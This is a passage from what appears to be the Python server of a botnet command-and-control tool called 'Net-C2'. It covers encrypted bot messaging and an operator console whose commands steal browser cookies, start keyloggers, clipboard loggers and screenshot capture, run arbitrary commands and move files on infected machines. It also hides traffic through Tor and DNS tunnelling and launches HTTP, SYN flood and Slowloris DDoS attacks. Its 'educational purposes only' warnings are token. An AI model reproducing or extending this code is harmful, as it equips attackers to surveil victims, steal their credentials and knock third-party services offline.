        return nonce + ciphertext + tag

    def decrypt_data(self, encrypted_data):
        """Decrypt encrypted data using AES-256-GCM (nonce + ciphertext + tag)"""
        try:
            # Nonce is first 12 bytes, tag is last 16 bytes
            if len(encrypted_data) < 12 + 16:
                raise ValueError("Encrypted payload too short")
            nonce = encrypted_data[:12]
            tag = encrypted_data[-16:]
            ciphertext = encrypted_data[12:-16]
            cipher = AES.new(self.encryption_key, AES.MODE_GCM, nonce=nonce)
            decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted_data.decode('utf-8')
        except Exception as e:
            # Backward compatibility for old format (CBC)
            try:
                iv = encrypted_data[:16]
                actual_data = encrypted_data[16:]
                cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
                decrypted_data = unpad(cipher.decrypt(actual_data), AES.block_size)
                return decrypted_data.decode('utf-8')
            except Exception:
                raise e

    def send_command(self, bot_id, command):
        with self.lock:
            if bot_id not in self.bots:
                return False
        
        if command in ["keylogger_start", "keylogger_stop", "clipboard_start", "clipboard_stop"]:
            self.command_queue.put({
                'bot_id': bot_id,
                'command': command,
                'action': 'execute',
                'silent': True  # No output to main console
            })
            return True
            
        # Legacy inline 'upload' handling removed. Use handle_command('upload ...') path only.
                
                # If command is not defined, send directly to bot
        self.command_queue.put({
            'bot_id': bot_id,
            'command': command,
            'action': 'execute'
        })
        return True

    def broadcast_command(self, command):
        """Broadcast a command to all connected bots by enqueuing one task per bot."""
        try:
            with self.lock:
                target_bot_ids = list(self.bots.keys())
            for target_bot_id in target_bot_ids:
                self.command_queue.put({
                    'bot_id': target_bot_id,
                    'command': command,
                    'action': 'execute'
                })
            return True
        except Exception:
            return False

    def cleaner(self):
        while self.active:
            time.sleep(60)
            with self.lock:
                current_time = time.time()
                to_delete = []
                for bot_id, bot in self.bots.items():
                    if current_time - bot['last_seen'] > 300:
                        to_delete.append(bot_id)
                for bot_id in to_delete:
                    print(f"\033[93m[-] Bot timed out: {bot_id}\033[0m")
                    self.bots[bot_id]['conn'].close()
                    del self.bots[bot_id]

    def admin_console(self):
        while self.active:
            try:
                cmd = input("\033[1;36mNet-C2>\033[0m ").strip()
                
                # Add command to history
                self._add_to_history(cmd)
                
                if not cmd:
                    print()
                    continue
                
                # Help check - for console loop
                parts = cmd.split()
                if len(parts) >= 2 and parts[-1] == '?':
                    main_cmd = parts[0].lower()
                    # Check all commands in help system
                    help_commands = ['cmd', 'upload', 'download', 'list', 'server', 'security', 'alerts', 
                               'processes', 'keylogger', 'clipboard', 'tor', 'dns_tunnel', 'web', 
                               'show', 'broadcast', 'clear', 'exit', 'help', 'network_map',
                               'cookies', 'copy', 'screenshot', 'sysinfo', 'isvm', 'whoami', 'pwd', 'ls', 'ss', 'ddos']
                    if main_cmd in help_commands:
                        self._show_command_help(main_cmd)
                        continue
                
                elif cmd == 'list':
                    with self.lock:
                        if not self.bots:
                            print("\033[93m[!] No active bots\033[0m")
                            continue
                            
                        print("\n\033[95mActive Bots:\033[0m")
                        for bot_id, bot in self.bots.items():
                            # Get bot status information
                            p2p_status = self.p2p_status.get(bot_id, {}).get('status', 'unknown')
                            has_alert = bot_id in self.wireshark_alerts
                            
                            # Status icons
                            p2p_icon = "🟢" if p2p_status == 'active' else "🔴" if p2p_status == 'stopped' else "⚪"
                            alert_icon = "⚠️" if has_alert else "✅"
                            
                            print(f"  \033[96m•\033[0m {bot_id} \033[90m({bot['ip']})\033[0m")
                            print(f"     \033[93mLast seen:\033[0m {time.ctime(bot['last_seen'])}")
                            print(f"     \033[94mP2P Status:\033[0m {p2p_icon} {p2p_status}")
                            print(f"     \033[91mSecurity:\033[0m {alert_icon} {'Alert' if has_alert else 'Clean'}")
                            print()
                
                elif cmd == 'server':
                    print("\n\033[95mServer Information:\033[0m")
                    print(f"  \033[96m•\033[0m Host: \033[93m{self.host}\033[0m")
                    print(f"  \033[96m•\033[0m Port: \033[93m{self.port}\033[0m")
                    print(f"  \033[96m•\033[0m Encryption: \033[93mAES-256-CBC\033[0m")
                    print(f"  \033[96m•\033[0m Active Bots: \033[93m{len(self.bots)}\033[0m")
                    print(f"  \033[96m•\033[0m Uptime: \033[93m{time.ctime()}\033[0m")
                    print(f"  \033[96m•\033[0m IPv6 Support: \033[93m{'Enabled' if self.ipv6_enabled else 'Disabled'}\033[0m")
                    print(f"  \033[96m•\033[0m Security Rules: \033[93m{'Enabled' if self.security_rules_enabled else 'Disabled'}\033[0m")
                    print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
                    print(f"  \033[96m•\033[0m Data Folders:")
                    print(f"     - Cookies: \033[93m{'cookies/'}\033[0m")
                    print(f"     - Clipboard: \033[93m{'clipboard_data/'}\033[0m")
                    print(f"  \033[96m•\033[0m Command Queue: \033[93m{self.command_queue.qsize()} pending\033[0m")
                    print("\n\033[95mServer Status:\033[0m \033[92mACTIVE\033[0m\n")
                
                
                elif cmd == 'security':
                    print("\n\033[95mSecurity Rules Status:\033[0m")
                    print("  \033[96m•\033[0m Security Rules: \033[93m{'ENABLED' if self.security_rules_enabled else 'DISABLED'}\033[0m")
                    print("  \033[96m•\033[0m Rule #1: C2 Connected → P2P OFF")
                    print("  \033[96m•\033[0m Rule #2: Wireshark Detected → C2 + P2P OFF")
                    print("  \033[96m•\033[0m Rule #3: C2 Failed + No Wireshark → P2P ON")
                    
                    with self.lock:
                        active_alerts = len(self.wireshark_alerts)
                        active_p2p = len([s for s in self.p2p_status.values() if s['status'] == 'active'])
                    
                    print(f"  \033[96m•\033[0m Active Security Alerts: \033[93m{active_alerts}\033[0m")
                    print(f"  \033[96m•\033[0m Active P2P Networks: \033[93m{active_p2p}\033[0m")
                    print("\n\033[95mSecurity Status:\033[0m \033[92mPROTECTED\033[0m\n")
                
                elif cmd == 'p2p status':
                    print("\n\033[95mP2P Network Status:\033[0m")
                    
                    with self.lock:
                        if not self.p2p_status:
                            print("  \033[93m[!] No P2P activity detected\033[0m")
                        else:
                            for bot_id, status_info in self.p2p_status.items():
                                status = status_info['status']
                                timestamp = time.ctime(status_info['timestamp'])
                                color = "\033[92m" if status == 'active' else "\033[93m"
                                print(f"  {color}•\033[0m {bot_id}: {status} \033[90m({timestamp})\033[0m")
                    
                    print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
                    print(f"  \033[96m•\033[0m IPv6 Support: \033[93m{'Enabled' if self.ipv6_enabled else 'Disabled'}\033[0m")
                    print("\n\033[95mP2P Status:\033[0m \033[94mMONITORING\033[0m\n")
                
                elif cmd == 'alerts':
                    print("\n\033[95mSecurity Alerts:\033[0m")
                    
                    with self.lock:
                        if not self.wireshark_alerts and not hasattr(self, 'security_alerts'):
                            print("  \033[92m[+] No security alerts\033[0m")
                        else:
                            # Wireshark alerts
                            if self.wireshark_alerts:
                                print("  \033[94m[*] Wireshark Alerts:\033[0m")
                                for bot_id, alert_info in self.wireshark_alerts.items():
                                    message = alert_info['message']
                                    timestamp = time.ctime(alert_info['timestamp'])
                                    print(f"    \033[91m•\033[0m {bot_id}: {message} \033[90m({timestamp})\033[0m")
                            
                            # Security alerts
                            if hasattr(self, 'security_alerts') and self.security_alerts:
                                print("  \033[94m[*] Security Alerts:\033[0m")
                                for bot_id, alert_info in self.security_alerts.items():
                                    target_ip = alert_info['target_ip']
                                    message = alert_info['message']
                                    attack_blocked = alert_info['attack_blocked']
                                    timestamp = time.ctime(alert_info['timestamp'])
                                    
                                    status_color = "\033[91m" if attack_blocked else "\033[93m"
                                    status_text = "BLOCKED" if attack_blocked else "WARNING"
                                    
                                    print(f"    {status_color}•\033[0m {bot_id} -> {target_ip}: {message} \033[90m({timestamp})\033[0m")
                                    print(f"      {status_color}Status: {status_text}\033[0m")
                    
                    print("\n\033[95mAlert Status:\033[0m \033[93mMONITORING\033[0m\n")
                
                elif cmd == 'web start':
                    if self.start_web_dashboard():
                        print("\033[92m[+] Web dashboard started successfully\033[0m")
                    else:
                        print("\033[91m[!] Failed to start web dashboard\033[0m")
                
                elif cmd == 'web stop':
                    if self.stop_web_dashboard():
                        print("\033[92m[+] Web dashboard stopped successfully\033[0m")
                    else:
                        print("\033[91m[!] Failed to stop web dashboard\033[0m")
                
                elif cmd == 'vuln status':
                    # Vulnerability Scanner : Disabled :(
                    print("\n\033[95mVulnerability Scanner Status:\033[0m")
                    print("  \033[96m•\033[0m Enabled: \033[93mNo\033[0m")
                    print("  \033[96m•\033[0m Sources: \033[93mExploitDB, PacketStorm, NVD, CVE Details, SecurityFocus (Disabled)\033[0m")
                    print("\n\033[95mVulnerability Scanner Status:\033[0m \033[94mDISABLED\033[0m\n")
                
                elif cmd == 'vuln summary':
                    # Vulnerability Summary : Disabled :(
                    print("\n\033[95mVulnerability Summary:\033[0m")
                    print("  \033[96m•\033[0m Status: \033[93mDisabled\033[0m (ExploitDB/PacketStorm/NVD/CVE Details/SecurityFocus)\n")
                
                
                elif cmd.startswith('processes '):
                    parts = cmd.split(maxsplit=1)
                    if len(parts) < 2:
                        self._show_command_help('processes')
                        continue
                    bot_id = parts[1]
                    
                    # Check if bot exists
                    with self.lock:
                        if bot_id not in self.bots:
                            print(f"\033[93m[!] Bot not found: {bot_id}\033[0m")
                            continue
                    
                    # Mark pending command
                    self._pending_processes_command = {'bot_id': bot_id}
                    
                    # Send command
                    result = self.send_command(bot_id, 'processes')
                    if result is False:
                        print(f"\033[93m[!] Failed to send command to bot: {bot_id}\033[0m")
                        self._pending_processes_command = None
                    else:
                        print(f"\033[94m[*] Requesting process information from {bot_id}...\033[0m")
                
                elif cmd == 'show exploits':
                    self._show_exploits()
                
                elif cmd == 'show stats':
                    self._show_stats()
                
                elif cmd == 'show logs':
                    self._show_logs()
                
                elif cmd == 'show config':
                    self._show_config()
                
                elif cmd == 'show history':
                    self._show_history()
                
                elif cmd == 'show files':
                    self._show_files()
                
                elif cmd == 'show network':
                    self._show_network()
                
                elif cmd == 'show':
                    self._show_help()
                
                elif cmd == 'web status':
                    print("\n\033[95mWeb Dashboard Status:\033[0m")
                    print(f"  \033[96m•\033[0m Status: \033[93m{'RUNNING' if self.web_dashboard_enabled else 'STOPPED'}\033[0m")
                    print(f"  \033[96m•\033[0m Host: \033[93m{self.web_dashboard_host}\033[0m")
                    print(f"  \033[96m•\033[0m Port: \033[93m{self.web_dashboard_port}\033[0m")
                    if self.web_dashboard_enabled:
                        print(f"  \033[96m•\033[0m URL: \033[93mhttp://{self.web_dashboard_host}:{self.web_dashboard_port}\033[0m")
                    print(f"  \033[96m•\033[0m Flask Available: \033[93m{'YES' if WEB_DASHBOARD_AVAILABLE else 'NO'}\033[0m")
                    print("\n\033[95mWeb Dashboard Status:\033[0m \033[94mMONITORING\033[0m\n")
                
                elif cmd == 'help':
                    print("\n\033[95mAvailable Commands:\033[0m")
                    print("  \033[96m•\033[0m list       - Show Connected Bots")
                    print("  \033[96m•\033[0m cmd <ID> <command> - Send Command to Bot")
                    print("  \033[96m•\033[0m broadcast <command> - Send Command to All Bots")
                    print("  \033[96m•\033[0m upload <ID> <LPATH> - Upload File to Bot")
                    print("  \033[96m•\033[0m download <ID> <RPATH> - Download Files from Bot")
                    print("  \033[96m•\033[0m cookies <ID> - Steals Browser Cookies")
                    print("  \033[96m•\033[0m server       - Show Server Information")
                    print("  \033[96m•\033[0m tor help    - Show Tor Command Help")
                    print("  \033[96m•\033[0m tor enable  - Starting Tor Server")
                    print("  \033[96m•\033[0m tor disable - Stopping Tor Server")
                    print("  \033[96m•\033[0m tor renew   - Renew Tor Identity")
                    print("  \033[96m•\033[0m tor status  - Show Tor Status")
                    print("  \033[96m•\033[0m tor bots    - Show Tor Connected Bots")
                    print("  \033[96m•\033[0m ss start <ID>    - Start Screen Shots")
                    print("  \033[96m•\033[0m ss stop <ID>     - Stop Screen Shots")
                    print("  \033[96m•\033[0m clearnet bots - Show Clearnet Connected Bots")
                    print("  \033[96m•\033[0m clear      - Clear Console")
                    print("  \033[96m•\033[0m stop <ID> - Closes the Bot")
                    print("  \033[96m•\033[0m exit       - Shutdown Server")
                    print("  --------------------------------------------------------")
                    print("\033[95mAI and MCP Commands:\033[0m")
                    print("  \033[96m•\033[0m mcp on   - Opens the MCP Connection")
                    print("  \033[96m•\033[0m mcp off  - Closes the MCP Connection")
                    print("  --------------------------------------------------------")
                    print("\033[95mSecurity & P2P Commands:\033[0m")
                    print("  \033[96m•\033[0m security   - Show Security Rules Status")
                    print("  \033[96m•\033[0m p2p status - Show P2P Network Status")
                    print("  \033[96m•\033[0m alerts     - Show Security Alerts")
                    print("  --------------------------------------------------------")
                    print("\033[95mWeb Dashboard Commands:\033[0m")
                    print("  \033[96m•\033[0m web start  - Start Web Dashboard")
                    print("  \033[96m•\033[0m web stop   - Stop Web Dashboard")
                    print("  \033[96m•\033[0m web status - Show Web Dashboard Status")
                    print("  \033[96m•\033[0m cmd <bot_id> <command> - Execute System Commands")
                    print("  \033[96m•\033[0m Example: cmd bot-123 whoami")
                    print("  \033[96m•\033[0m Example: cmd bot-123 isvm")
                    print("  \033[96m•\033[0m Example: cmd bot-123 pwd")
                    print("  \033[96m•\033[0m processes <bot_id> - Show Running Processes")
                    print("  --------------------------------------------------------")
                    print("\033[95mShow Commands:\033[0m")
                    print("  \033[96m•\033[0m show exploits - Show Comprehensive Exploit Database")
                    print("  \033[96m•\033[0m show stats - Show System Statistics")
                    print("  \033[96m•\033[0m show logs - Show System Logs")
                    print("  \033[96m•\033[0m show config - Show Server Configuration")
                    print("  \033[96m•\033[0m show history - Show Command History")
                    print("  \033[96m•\033[0m show files - Show File System Info")
                    print("  \033[96m•\033[0m show network - Show Network Information")
                    print("  \033[96m•\033[0m show - Show Help for Show Commands")
                    print("  --------------------------------------------------------")
                    print("\033[95mVulnerability Scanner Commands (Disabled):\033[0m")
                    print("  \033[96m•\033[0m vuln status   - Coming Soon...")
                    print("  \033[96m•\033[0m vuln summary  - Coming Soon...")
                    print("  --------------------------------------------------------")
                    print("\033[95mNetwork Mapping Commands:\033[0m")
                    print("  \033[96m•\033[0m network_map start <bot_id> [scope] - Start Network Mapping")
                    print("  \033[96m•\033[0m network_map status <bot_id> - Check Mapping Status")
                    print("  \033[96m•\033[0m network_map stop <bot_id> - Stop Network Mapping")
                    print("  \033[96m•\033[0m network_maps - Show All Network Maps")
                    print("  \033[96m•\033[0m Example: network_map start bot-123 192.168.1.0/24")
                    print("  \033[96m•\033[0m Example: network_maps")
                    print("  --------------------------------------------------------")
                    print("\033[95mPersistence Systems:\033[0m")
                    print("  \033[91m•\033[0m ? - Coming Soon...\033[0m")
                    print("  --------------------------------------------------------")
                    print("\033[95mSystem Copy Commands:\033[0m")
                    print("  \033[96m•\033[0m system_copy <bot_id> - DISABLED for safety")
                    print("  \033[96m•\033[0m copy_status <bot_id> - DISABLED for safety")
                    print("  \033[91m•\033[0m System replication disabled for safety")
                    print("  \033[91m•\033[0m Auto-copy functionality removed")
                
                elif cmd.startswith('cmd '):
                    parts = cmd.split(maxsplit=2)
                    if len(parts) < 3:
                        self._show_command_help('cmd')
                        continue
                        
                    bot_id = parts[1]
                    command = parts[2]
                    
                    if self.send_command(bot_id, command):
                        print(f"\033[92m[+] Command sent to {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot {bot_id} not found\033[0m")
                        
                elif cmd == 'tor enable':
                    if not self.tor_process:
                        if self.start_tor():
                            print("\033[92m[+] Tor service started successfully\033[0m")
                        else:
                            print("\033[91m[!] Failed to start Tor service\033[0m")
                    else:
                        print("\033[91m[!] Tor service is already running\033[0m")
                
                elif cmd == 'tor disable':
                    if self.tor_process:
                        if self.stop_tor():
                            print("\033[92m[+] Tor service stopped successfully\033[0m")
                        else:
                            print("\033[91m[!] Failed to stop Tor service\033[0m")
                    else:
                        print("\033[91m[!] Tor service is not running\033[0m")

                
                elif cmd == 'tor renew':
                    if self.tor_enabled:
                        self.renew_tor_identity()
                    else:
                        print("\033[93m[!] Tor mode is not active\033[0m")
                
                elif cmd == 'tor status':
                    print("\n\033[95mTor Status:\033[0m")
                    print(f"  \033[96m•\033[0m Tor Enabled: \033[93m{'YES' if self.tor_enabled else 'NO'}\033[0m")
                    print(f"  \033[96m•\033[0m Tor Process: \033[93m{'RUNNING' if self.tor_process else 'STOPPED'}\033[0m")
                    print(f"  \033[96m•\033[0m Tor Port: \033[93m{self.tor_port}\033[0m")
                    print(f"  \033[96m•\033[0m SOCKS5 Proxy: \033[93m{'AVAILABLE' if SOCKS_AVAILABLE else 'NOT AVAILABLE'}\033[0m")
                    
                    # Tor proxy status
                    if self.tor_enabled and SOCKS_AVAILABLE:
                        print(f"  \033[96m•\033[0m Command Routing: \033[92mVIA TOR\033[0m")
                    elif self.tor_enabled and not SOCKS_AVAILABLE:
                        print(f"  \033[96m•\033[0m Command Routing: \033[91mCLEARNET (PySocks missing)\033[0m")
                    else:
                        print(f"  \033[96m•\033[0m Command Routing: \033[94mCLEARNET\033[0m")
                    
                    # Count bots connected via Tor
                    tor_bots = [bot_id for bot_id, bot in self.bots.items() 
                               if bot.get('tor_enabled', False)]
                    print(f"  \033[96m•\033[0m Tor Bots: \033[93m{len(tor_bots)}\033[0m")
                    
                    if tor_bots:
                        print("  \033[96m•\033[0m Tor Bot List:")
                        for bot_id in tor_bots:
                            print(f"     - {bot_id}")
                    
                    if not SOCKS_AVAILABLE:
                        print(f"\n  \033[93m⚠️  Install PySocks for full Tor support: pip install PySocks\033[0m")
                    
                    print("\n\033[95mTor Status:\033[0m \033[94mMONITORING\033[0m\n")
                
                elif cmd == 'tor bots':
                    tor_bots = [bot_id for bot_id, bot in self.bots.items() 
                               if bot.get('tor_enabled', False)]
                    
                    if tor_bots:
                        print("\n\033[95mTor Connected Bots:\033[0m")
                        for bot_id in tor_bots:
                            bot = self.bots[bot_id]
                            print(f"  \033[96m•\033[0m {bot_id} \033[90m({bot['ip']})\033[0m")
                            print(f"     \033[93mLast seen:\033[0m {time.ctime(bot['last_seen'])}")
                            print(f"     \033[94mPlatform:\033[0m {bot.get('platform', 'Unknown')}")
                            print()
                    else:
                        print("\033[93m[!] No Tor bots connected\033[0m")
                
                # DNS Tunneling commands
                elif cmd.startswith('dns_tunnel '):
                    parts = cmd.split()
                    if len(parts) < 2:
                        self._show_command_help('dns_tunnel')
                    elif parts[1] == 'enable':
                        if len(parts) < 3:
                            print("\033[91m[!] Usage: dns_tunnel enable <domain>\033[0m")
                            print("\033[93m[*] Example: dns_tunnel enable c2domain.com\033[0m")
                        else:
                            domain = parts[2]
                            self.start_dns_tunnel(domain)
                    elif parts[1] == 'disable':
                        self.stop_dns_tunnel()
                    elif parts[1] == 'status':
                        print("\n\033[95mDNS Tunneling Status:\033[0m")
                        print(f"  \033[96m•\033[0m DNS Tunnel: \033[93m{'ENABLED' if self.dns_tunnel_enabled else 'DISABLED'}\033[0m")
                        print(f"  \033[96m•\033[0m Domain: \033[93m{self.dns_tunnel_domain if self.dns_tunnel_domain else 'Not set'}\033[0m")
                        print(f"  \033[96m•\033[0m Port: \033[93m{self.dns_port}\033[0m")
                        print(f"  \033[96m•\033[0m dnslib: \033[93m{'AVAILABLE' if DNS_AVAILABLE else 'NOT AVAILABLE'}\033[0m")
                        
                        # DNS Tunnel bots connected
                        dns_bots = [bot_id for bot_id, bot in self.bots.items() 
                                   if bot.get('dns_tunnel', False)]
                        print(f"  \033[96m•\033[0m DNS Tunnel Bots: \033[93m{len(dns_bots)}\033[0m")
                        
                        if dns_bots:
                            print("  \033[96m•\033[0m Bot List:")
                            for bot_id in dns_bots:
                                print(f"     - {bot_id}")
                        
                        if not DNS_AVAILABLE:
                            print(f"\n  \033[93m⚠️  Install dnslib: pip install dnslib\033[0m")
                        
                        print()
                    else:
                        self._show_command_help('dns_tunnel')
                
                elif cmd == 'clearnet bots':
                    clearnet_bots = [bot_id for bot_id, bot in self.bots.items() 
                                    if not bot.get('tor_enabled', False)]
                    
                    if clearnet_bots:
                        print("\n\033[95mClearnet Connected Bots:\033[0m")
                        for bot_id in clearnet_bots:
                            bot = self.bots[bot_id]
                            print(f"  \033[96m•\033[0m {bot_id} \033[90m({bot['ip']})\033[0m")
                            print(f"     \033[93mLast seen:\033[0m {time.ctime(bot['last_seen'])}")
                            print(f"     \033[94mPlatform:\033[0m {bot.get('platform', 'Unknown')}")
                            print()
                    else:
                        print("\033[93m[!] No clearnet bots connected\033[0m")
                
                elif cmd.startswith('ai target '):
                    target_ip = cmd.split()[2]
                    bot_id = cmd.split()[1]
                    
                    if self.send_command(bot_id, f"smart_target {target_ip}"):
                        print(f"\033[92m[+] Smart targeting started: {bot_id} -> {target_ip}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('ai evasion '):
                    print("\033[91m[!] 'ai evasion' command is disabled for safety\033[0m")
                
                # AI/ML Commands : Disabled :(
                
                elif cmd.startswith('copy start '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "clipboard_start"):
                        print(f"\033[92m[+] Clipboard logger started: {bot_id}\033[0m")
                        clipboard_file = f"clipboard_data/copy_{bot_id.replace('/', '_').replace('\\', '_')}.txt"
                        try:
                            with open(clipboard_file, "w", encoding="utf-8") as f:
                                f.write(f"--- Clipboard logging started at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
                            print(f"\033[92m[+] Clipboard log file prepared: {clipboard_file}\033[0m")
                        except Exception as e:
                            print(f"\033[91m[!] Clipboard file preparation error: {e}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                                
                
                elif cmd.startswith('copy stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "clipboard_stop"):
                        print(f"\033[92m[+] Clipboard logger stopped: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('keylogger start '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "keylogger_start"):
                        print(f"\033[92m[+] Keylogger started: {bot_id}\033[0m")
                        print(f"\033[94m[*] Bot will connect to Kserver.py for keylogging\033[0m")
                        print(f"\033[93m[!] Make sure Kserver.py is running separately\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('keylogger stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "keylogger_stop"):
                        print(f"\033[92m[+] Keylogger stopped: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('ss start '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "ss_start"):
                        print(f"\033[92m[+] Screenshot started: {bot_id}\033[0m")
                        print(f"\033[94m[*] Screenshots will be saved to ScreenS/ folder\033[0m")
                        print(f"\033[93m[*] Capturing every 10 seconds\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('ss stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "ss_stop"):
                        print(f"\033[92m[+] Screenshot stopped: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('ddos start '):
                    try:
                        parts = cmd.split()
                        if len(parts) < 4:
                            print(f"\033[91m[!] Usage: ddos start <bot_id> <target_ip> [--duration 30] [--threads 50]\033[0m")
                            continue
                        
                        bot_id = parts[2]
                        target_ip = parts[3]
                        
                        # Default values
                        duration = 30
                        threads = 50
                        
                        # Parse optional parameters
                        i = 4
                        while i < len(parts):
                            if parts[i] == '--duration' and i + 1 < len(parts):
                                duration = int(parts[i + 1])
                                i += 2
                            elif parts[i] == '--threads' and i + 1 < len(parts):
                                threads = int(parts[i + 1])
                                i += 2
                            else:
                                i += 1
                        
                        # Validate parameters
                        if duration > 300:
                            duration = 300
                            print(f"\033[93m[!] Duration limited to 300 seconds\033[0m")
                        
                        if threads > 100:
                            threads = 100
                            print(f"\033[93m[!] Threads limited to 100\033[0m")
                        
                        # Send command to bot
                        ddos_command = f"ddos_start|{target_ip}|80|{duration}|{threads}"
                        if self.send_command(bot_id, ddos_command):
                            print(f"\033[92m[+] DDoS attack started: {bot_id}\033[0m")
                            print(f"\033[94m[*] Target: {target_ip}:80\033[0m")
                            print(f"\033[94m[*] Duration: {duration} seconds\033[0m")
                            print(f"\033[94m[*] Threads: {threads}\033[0m")
                            print(f"\033[91m[!] WARNING: Use only for educational purposes!\033[0m")
                        else:
                            print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                            
                    except ValueError:
                        print(f"\033[91m[!] Invalid parameters. Use integers for duration and threads.\033[0m")
                    except Exception as e:
                        print(f"\033[91m[!] DDoS command error: {e}\033[0m")
                
                elif cmd.startswith('ddos syn '):
                    try:
                        parts = cmd.split()
                        if len(parts) < 4:
                            print(f"\033[91m[!] Usage: ddos syn <bot_id> <target_ip> [--duration 30] [--threads 100]\033[0m")
                            continue
                        
                        bot_id = parts[2]
                        target_ip = parts[3]
                        
                        # Default values
                        duration = 30
                        threads = 100
                        
                        # Parse optional parameters
                        i = 4
                        while i < len(parts):
                            if parts[i] == '--duration' and i + 1 < len(parts):
                                duration = int(parts[i + 1])
                                i += 2
                            elif parts[i] == '--threads' and i + 1 < len(parts):
                                threads = int(parts[i + 1])
                                i += 2
                            else:
                                i += 1
                        
                        # Validate parameters
                        if duration > 300:
                            duration = 300
                            print(f"\033[93m[!] Duration limited to 300 seconds\033[0m")
                        
                        if threads > 200:
                            threads = 200
                            print(f"\033[93m[!] Threads limited to 200 for SYN flood\033[0m")
                        
                        # Send command to bot
                        ddos_command = f"ddos_syn|{target_ip}|80|{duration}|{threads}"
                        if self.send_command(bot_id, ddos_command):
                            print(f"\033[92m[+] SYN Flood attack started: {bot_id}\033[0m")
                            print(f"\033[94m[*] Target: {target_ip}:80\033[0m")
                            print(f"\033[94m[*] Duration: {duration} seconds\033[0m")
                            print(f"\033[94m[*] Threads: {threads}\033[0m")
                            print(f"\033[91m[!] WARNING: Use only for educational purposes!\033[0m")
                        else:
                            print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                            
                    except ValueError:
                        print(f"\033[91m[!] Invalid parameters. Use integers for duration and threads.\033[0m")
                    except Exception as e:
                        print(f"\033[91m[!] SYN Flood command error: {e}\033[0m")
                
                elif cmd.startswith('ddos slowloris '):
                    try:
                        parts = cmd.split()
                        if len(parts) < 4:
                            print(f"\033[91m[!] Usage: ddos slowloris <bot_id> <target_ip> [--duration 60] [--connections 100]\033[0m")
                            continue
                        
                        bot_id = parts[2]
                        target_ip = parts[3]
                        
                        # Default values
                        duration = 60
                        connections = 100
                        
                        # Parse optional parameters
                        i = 4
                        while i < len(parts):
                            if parts[i] == '--duration' and i + 1 < len(parts):
                                duration = int(parts[i + 1])
                                i += 2
                            elif parts[i] == '--connections' and i + 1 < len(parts):
                                connections = int(parts[i + 1])
                                i += 2
                            else:
                                i += 1
                        
                        # Validate parameters
                        if duration > 300:
                            duration = 300
                            print(f"\033[93m[!] Duration limited to 300 seconds\033[0m")
                        
                        if connections > 500:
                            connections = 500
                            print(f"\033[93m[!] Connections limited to 500 for Slowloris\033[0m")
                        
                        # Send command to bot
                        ddos_command = f"ddos_slowloris|{target_ip}|80|{duration}|{connections}"
                        if self.send_command(bot_id, ddos_command):
                            print(f"\033[92m[+] Slowloris attack started: {bot_id}\033[0m")
                            print(f"\033[94m[*] Target: {target_ip}:80\033[0m")
                            print(f"\033[94m[*] Duration: {duration} seconds\033[0m")
                            print(f"\033[94m[*] Connections: {connections}\033[0m")
                            print(f"\033[91m[!] WARNING: Use only for educational purposes!\033[0m")
                        else:
                            print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                            
                    except ValueError:
                        print(f"\033[91m[!] Invalid parameters. Use integers for duration and connections.\033[0m")
                    except Exception as e:
                        print(f"\033[91m[!] Slowloris command error: {e}\033[0m")
                
                elif cmd.startswith('ddos stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "ddos_stop"):
                        print(f"\033[92m[+] DDoS attack stopped: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('cookies '):
                    bot_id = cmd.split(maxsplit=1)[1]
                    if self.send_command(bot_id, "get_cookies"):
                        print(f"\033[92m[+] Cookie request sent: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                    
                elif cmd.startswith('upload '):
                    parts = cmd.split(maxsplit=2)
                    if len(parts) != 3:
                        self._show_command_help('upload')
                        continue
                    bot_id = parts[1]
                    file_path = parts[2]
                    if not os.path.exists(file_path):
                        print(f"Error: File not found: {file_path}")
                        continue
                    try:
                        with open(file_path, 'rb') as f:
                            file_bytes = f.read()
                        b64_data = base64.b64encode(file_bytes).decode('utf-8')
                        remote_name = os.path.basename(file_path)
                        self.command_queue.put({
                            'bot_id': bot_id,
                            'command': f"file_upload {remote_name} {b64_data}",
                            'action': 'file_upload',
                            'silent': True
                        })
                        print(f"\033[92m[+] File upload command queued for {bot_id}: {remote_name}\033[0m")
                    except Exception as e:
                        print(f"\033[91m[!] File read error: {e}\033[0m")
                
                elif cmd.startswith('download '):
                    parts = cmd.split(maxsplit=2)
                    if len(parts) != 3:
                        self._show_command_help('download')
                        continue
                    
                    bot_id = parts[1]
                    remote_path = parts[2]
                    
                    # Create downloads directory
                    downloads_dir = f"downloads/{bot_id}"
                    os.makedirs(downloads_dir, exist_ok=True)
                    
                    if self.send_command(bot_id, f"file_download {remote_path}"):
